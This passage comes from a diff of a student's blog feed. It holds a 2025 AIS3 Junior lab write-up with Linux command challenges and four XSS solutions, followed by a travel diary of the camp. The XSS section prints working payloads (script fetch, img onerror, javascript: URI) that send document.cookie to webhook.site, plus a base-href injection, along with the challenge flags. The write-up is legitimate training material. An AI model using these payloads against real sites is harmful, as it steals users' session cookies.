+He said he wanted to add a meow file to &lt;code&gt;/&lt;/code&gt;&amp;rsquo;s &lt;code&gt;/tmp&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/H17sslUuee.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+Then, &lt;code&gt;cd /&lt;/code&gt;, then &lt;code&gt;cd /tmp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Then &lt;code&gt;touch meow&lt;/code&gt;&lt;br&gt;
+Finally, &lt;code&gt;ls&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/ByTL2g8dll.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{M30W_M30W_900D_J0B5}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;challenge-4&#34;&gt;challenge-4
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/B1l9heL_xx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+This says to move the grep file to the folder for challenge 5. So, run &lt;code&gt;mv grep ~/challenge-5&lt;/code&gt;. Then the flag will appear.&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BJUxpgUdgl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{M0V3_M0VE_HURRY_UP!}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;challenge-5&#34;&gt;challenge-5
+&lt;/h3&gt;&lt;p&gt;In this question, grep is an executable file, so it should be preceded by &lt;code&gt;./&lt;/code&gt;&lt;br&gt;
+Then &lt;code&gt;./grep -r AIS3 maybe_here/&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/B1nTalL_gl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+If you have the previous flag, search for the flag after it in the same way.}&lt;br&gt;
+&lt;code&gt;./grep -r } maybe_here/&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HyR-0gIuxe.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{M4st3r_0f_S34rch_1$_p0w3rfu11}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;challenge-6&#34;&gt;challenge-6
+&lt;/h3&gt;&lt;p&gt;Same as before &lt;code&gt;cat flag&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SyJynWIOxl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+He said he wanted to delete it, so &lt;code&gt;rm flag&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SJVeh-Idle.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{RM_RF_CHUMMY_/_D0N7_D0_17_PL5}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;lab3&#34;&gt;Lab3
+&lt;/h2&gt;&lt;h3 id=&#34;xss1&#34;&gt;XSS1
+&lt;/h3&gt;&lt;p&gt;First, alert(123) to see if there is an XSS vulnerability.&lt;br&gt;
+&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1.png&#34;
+	width=&#34;858&#34;
+	height=&#34;244&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_b2d36386b0a33ec3.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_6c1074c47458715b.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;351&#34;
+		data-flex-basis=&#34;843px&#34;
+	
+&gt;&lt;br&gt;
+Successfully appeared, then try to look at the document.cookie of fetch and demo taught in class&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;script&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fetch(&amp;#34;https://webhook.site/3e16d364-01c8-4ab6-a932-77caff270ea1?&amp;#34;+document.cookie);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/script&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2.png&#34;
+	width=&#34;877&#34;
+	height=&#34;842&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_419fb31979a0a70f.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_f3a677ea8d738d.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;104&#34;
+		data-flex-basis=&#34;249px&#34;
+	
+&gt;&lt;br&gt;
+If you get the request, copy it to the admin.&lt;br&gt;
+&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3.png&#34;
+	width=&#34;1073&#34;
+	height=&#34;649&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_88b303db64dbbf05.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_89bd5ec331bd6009.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;165&#34;
+		data-flex-basis=&#34;396px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{w3lc0m3_70_x55_w0rld}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;xss2&#34;&gt;XSS2
+&lt;/h3&gt;&lt;p&gt;This question is to change it to a picture, so the payload is changed to&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1234&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;onerror&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://webhook.site/3e16d364-01c8-4ab6-a932-77caff270ea1?&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Same as above, pass it to admin&lt;br&gt;
+&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4.png&#34;
+	width=&#34;1176&#34;
+	height=&#34;647&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_a3ba054c814ceef1.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_6f56b97ad340bead.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;181&#34;
+		data-flex-basis=&#34;436px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{1nn3rh7ml_15_n07_3x3cu73_5cr1p7}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;xss3&#34;&gt;XSS3
+&lt;/h3&gt;&lt;p&gt;First, throw a random payload and find that it is a hyperlink written on the button.&lt;br&gt;
+&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5.png&#34;
+	width=&#34;695&#34;
+	height=&#34;361&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_4217b133355145a0.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_7ac543a0b1cd2f7e.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;192&#34;
+		data-flex-basis=&#34;462px&#34;
+	
+&gt;&lt;br&gt;
+Then write another &lt;code&gt;javascript:&lt;/code&gt; to update the properties&lt;br&gt;
+payload:&lt;code&gt;javascript:fetch(&#39;https://webhook.site/c08f7142-7637-4b38-b480-1343addd04c0?&#39;+encodeURIComponent(document.cookie))&lt;/code&gt;&lt;br&gt;
+Finally, throw it to the admin to get the flag&lt;br&gt;
+&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6.png&#34;
+	width=&#34;1014&#34;
+	height=&#34;840&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_5ee1a269c026ef49.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_7b415012f6228630.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;120&#34;
+		data-flex-basis=&#34;289px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{p53ud0_pr070c4l_15_50m3_71m3_3v4l}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;xss4&#34;&gt;XSS4
+&lt;/h3&gt;&lt;p&gt;If you throw any payload in, you will see&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SJR-DcvOlx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+It will finally be pieced together&lt;code&gt;https://c.beta-lib.dpdns.org/kind/lflflflflfl/static/script.js&lt;/code&gt;&lt;br&gt;
+payload=&lt;code&gt;&amp;lt;base href=&amp;quot;https://hamichiowo.github.io/JavaScript-db&amp;quot;&amp;gt;&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HJejs9Pdlg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{b453-url_w1ll_n07_f4llb4ck_70_d3f4ul7-5rc}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>2025 AIS3 Junior&#39;s Experience</title>
+        <link>https://agong88.github.io/en/post/2025-ais3-juniors-experience/</link>
+        <pubDate>Wed, 13 Aug 2025 00:00:00 +0800</pubDate>
+        
+        <guid>https://agong88.github.io/en/post/2025-ais3-juniors-experience/</guid>
+        <description>&lt;img src="https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image.png" alt="Featured image of post 2025 AIS3 Junior&#39;s Experience" /&gt;&lt;h1 id=&#34;day-0&#34;&gt;Day 0
+&lt;/h1&gt;&lt;p&gt;We left COSCUP quite early that day and headed south (for the direct train, it was really fast).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1.png&#34;
+	width=&#34;927&#34;
+	height=&#34;535&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_babe71d045664c90.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_b7bbb1b94ecfe129.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;High-speed rail timetable&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;173&#34;
+		data-flex-basis=&#34;415px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5.jpg&#34;
+	width=&#34;2048&#34;
+	height=&#34;1536&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_af401f887aaae84b.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_3465c0e82947d423.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Probably Taichung?&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;133&#34;
+		data-flex-basis=&#34;320px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;It was lunchtime when we arrived at NCKU, but the two teaching assistants hadn&amp;rsquo;t arrived yet, so I took another team member to join the other groups for lunch.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2.png&#34;
+	width=&#34;784&#34;
+	height=&#34;266&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_ee111eb5c506c578.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_2e1decde96437509.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;294&#34;
+		data-flex-basis=&#34;707px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_ec11698e61685de1.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_59bc67b3d24cbf7a.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Dinner, the beginning of the nightmare。元味屋和風洋食&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://maps.app.goo.gl/4iphDfHaXEv6QzB16&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;元味屋和風洋食&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;After returning home, I saw that TA was busy with the topic, so we had a small discussion about what to do, and it became their game space.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_55706e787dd2667d.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_2d077fe48495da27.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;TAs play a certain galgame&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h1 id=&#34;day-1&#34;&gt;Day 1
+&lt;/h1&gt;&lt;p&gt;The class was nothing special, but the food was really a food paradise near National Cheng Kung University. It was completely different from what it was two weeks ago.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_3cbd6d1748d3bc5a.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_72d87226f0511789.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Lunch。井選日式定食teisyoku tainan&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://maps.app.goo.gl/rQBV5TVr8Kgd4RPu6&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;井選日式定食teisyoku tainan&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I went back to discuss and work on the topic. I remember that I finished it very quickly. Then I went to the place I didn’t go in the morning.&lt;/p&gt;
+&lt;h1 id=&#34;day-2&#34;&gt;Day 2
+&lt;/h1&gt;&lt;p&gt;I don’t remember much the next day, but there was one thing that left a lasting impression on me. Remember that hamburger steak that I took a picture of and it looked really ugly? When I went to eat it for the second time, it made a big comeback in my stomach (I was so funny because I didn’t notice it).&lt;br&gt;
+The hamburger patty was a little pink, but I ate it anyway.&lt;br&gt;
+Later I developed acute gastroenteritis. I had diarrhea no matter what I ate, and I also had diarrhea even if I didn&amp;rsquo;t eat. I felt very uncomfortable for the next few days.&lt;br&gt;
+But I still have to go eat what I didn&amp;rsquo;t get to this morning&lt;a class=&#34;link&#34; href=&#34;https://maps.app.goo.gl/AmhBAreU4wRBUTm88&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;勝利早點&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_805db4aa63a782ce.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_5d067295ed50a0c8.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Is this… Tainan?&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8.jpg&#34;
+	width=&#34;1080&#34;
+	height=&#34;1920&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_2797fc2695e26525.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_b1da9394274ed053.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Tastes ordinary but pretty cheap&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;56&#34;
+		data-flex-basis=&#34;135px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h1 id=&#34;day-3&#34;&gt;Day 3
+&lt;/h1&gt;&lt;p&gt;Just go to class, but.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_d1ff8246fc5e62bf.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_3393b3d331d7e91d.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Woohoo, so sad&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3.png&#34;
+	width=&#34;1799&#34;
+	height=&#34;1560&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_a31e94b9ab2b9f0e.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_ef64e3e75d65acad.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Yay! No more staying up late to make presentations while having a stomachache!&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;115&#34;
+		data-flex-basis=&#34;276px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h1 id=&#34;day-46&#34;&gt;Day 4~6
+&lt;/h1&gt;&lt;p&gt;After wasting some time, I went to HITCON and got a bottle of wine that I didn’t get at DEVCORE CONFERENCE (but I wasn’t 18 at the time).&lt;br&gt;
+I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_a6b44e25dff1788c.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_c8eae1dd229792d.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Got it again after five months&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
 	
 &gt;&lt;/p&gt;
 </description>
